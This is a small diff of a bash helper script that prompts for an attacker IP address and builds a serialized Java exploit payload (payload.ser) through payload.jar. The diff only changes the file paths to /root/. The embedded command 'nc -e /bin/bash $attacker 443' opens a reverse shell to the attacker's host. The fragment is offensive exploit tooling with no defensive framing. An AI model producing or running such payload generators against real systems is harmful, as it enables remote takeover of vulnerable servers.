@@ -20,7 +20,7 @@ read attacker
 echo "Creating Payload with IP address" $attacker
 echo
 
-java -jar payload.jar payload.ser "nc -e /bin/bash $attacker 443" 
+java -jar /root/payload.jar /root/payload.ser "nc -e /bin/bash $attacker 443"
 
 echo "Payload successfully created and saved as 'payload.ser'"
 echo 
